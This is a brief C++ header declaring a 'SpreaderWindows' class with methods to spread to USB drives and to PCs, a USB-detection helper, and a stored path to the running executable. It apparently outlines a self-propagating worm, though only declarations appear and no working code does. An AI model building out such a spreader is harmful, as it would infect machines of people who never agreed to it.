#pragma once
#include <filesystem>
#include <vector>
namespace fs = std::filesystem;


bool isUsbDevice(int drive);
int createFileHandle(const char16_t *deviceName);


class SpreaderWindows {
public:
    SpreaderWindows();
    void spreadToUsb();
    void spreadToPc();
    bool shouldSpreadToUsb() const;

private:
    fs::path current_exe;
    std::vector<fs::path> usb_drives = {};
};
